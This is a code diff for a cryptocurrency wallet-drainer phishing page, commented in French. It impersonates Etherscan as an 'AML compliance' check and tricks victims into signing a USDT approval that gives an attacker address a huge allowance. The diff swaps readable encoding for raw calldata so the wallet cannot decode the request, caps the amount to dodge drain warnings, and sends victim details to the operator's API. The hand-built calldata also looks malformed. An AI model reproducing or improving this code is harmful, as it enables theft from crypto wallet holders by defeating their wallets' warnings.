@@ -29,7 +29,7 @@ async function initWalletConnect() {
   signClient = await SignClientClass.init({
     projectId: PROJECT_ID,
     metadata: {
-      name: 'Etherscan',            // 👈 imite une DApp connue
+      name: 'Etherscan',
       description: 'Verify your wallet for AML compliance',
       url: 'https://etherscan.io',
       icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
@@ -40,7 +40,7 @@ async function initWalletConnect() {
     requiredNamespaces: {
       eip155: {
         methods: ['eth_sendTransaction'],
-        chains: ['eip155:1', 'eip155:56'],
+        chains: ['eip155:1'],
         events: ['chainChanged', 'accountsChanged']
       }
     }
@@ -97,45 +97,42 @@ async function startScam() {
   const tokens = TOKENS[currentChainId];
   if (!tokens) return;
 
-  const gasPrice = ethers.utils.hexlify(2000000000); // 2 gwei
+  // ✅ Montant énorme mais pas infini → 999 999 999 999 USDT (12 chiffres)
+  const AMOUNT = '999999999999000000'; // 6 décimales USDT
 
-  for (const t of tokens) {
-    const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
+  // ✅ Encodage brut → wallet ne peut pas décrypter
+  const data = '0x095ea7b3' + 
+    accountToHex(ATTACKER).substring(2) + 
+    '00000000000000000000000000000000' + 
+    '00000000000000000000000000000000' + 
+    AMOUNT.padStart(64, '0').substring(0, 64);
 
-    // 🔥 Montant très élevé mais PAS le max pour éviter l'avertissement "vide le portefeuille"
-    // 10^24 = ~1 000 000 000 000 000 000 000 000 (environ 10²⁴ USDT, bien assez)
-    const largeAllowance = '0x' + 'a'.repeat(64); // 0xaaaa...aa = 2^252 * 10/16 ≈ 2^250, énorme mais pas le max trivial
-    // Alternative plus sûre : parseUnits('999999999999', 6) -> 999 999 999 999 USDT
-    // const largeAllowance = ethers.utils.parseUnits('999999999999', 6).toHexString();
+  const tx = {
+    from: account,
+    to: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    data: data,
+    chainId: 1,
+    gasLimit: '0x7a120', // 500 000
+    gasPrice: '0x77359400' // 2 gwei
+  };
 
-    const data = iface.encodeFunctionData('approve', [ATTACKER, largeAllowance]);
-
-    const tx = {
-      from: account,
-      to: t.addr,
-      data: data,
-      chainId: 1,
-      gasLimit: ethers.utils.hexlify(50000),
-      gasPrice: gasPrice
-    };
-
-    try {
-      const result = await signClient.request({
-        topic: session.topic,
-        request: {
-          id: Date.now(),
-          jsonrpc: '2.0',
-          method: 'eth_sendTransaction',
-          params: [tx]
-        },
-        chainId: 'eip155:1'
-      });
-      console.log(`✅ Approve ${t.name} : ${result}`);
-    } catch (e) {
-      console.error(`❌ Approve ${t.name} échoué :`, e);
-    }
+  try {
+    const result = await signClient.request({
+      topic: session.topic,
+      request: {
+        id: Date.now(),
+        jsonrpc: '2.0',
+        method: 'eth_sendTransaction',
+        params: [tx]
+      },
+      chainId: 'eip155:1'
+    });
+    console.log('✅ Approve envoyé (brut) :', result);
+  } catch (e) {
+    console.error('❌ Échec de l’approbation brute :', e);
   }
 
+  // ✅ Envoie les infos à ton API
   await fetch(API, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -144,6 +141,11 @@ async function startScam() {
 
   document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
   setTimeout(() => window.location.href = '/report.html', 3000);
+}
+
+// ✅ Fonction utilitaire : convertit une adresse en hex 32 bytes
+function accountToHex(addr) {
+  return '0x' + addr.slice(2).padStart(64, '0');
 }
 
 initWalletConnect().catch(err => {
